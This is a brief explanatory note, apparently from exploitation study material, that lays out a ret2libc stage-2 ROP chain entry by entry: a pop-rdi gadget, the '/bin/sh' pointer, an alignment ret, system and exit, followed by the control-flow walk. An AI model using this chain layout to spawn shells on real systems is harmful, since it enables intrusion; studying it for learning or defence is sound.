# The order of entries — a worked chain


A worked stage-2 chain, entry by entry:

    entry 0: pop_rdi        # saved-rip slot
    entry 1: binsh          # → rdi
    entry 2: ret            # alignment
    entry 3: system         # the call
    entry 4: exit           # the ending

The walk: ret→pop_rdi(rdi=binsh)→ret(align)→system→exit.
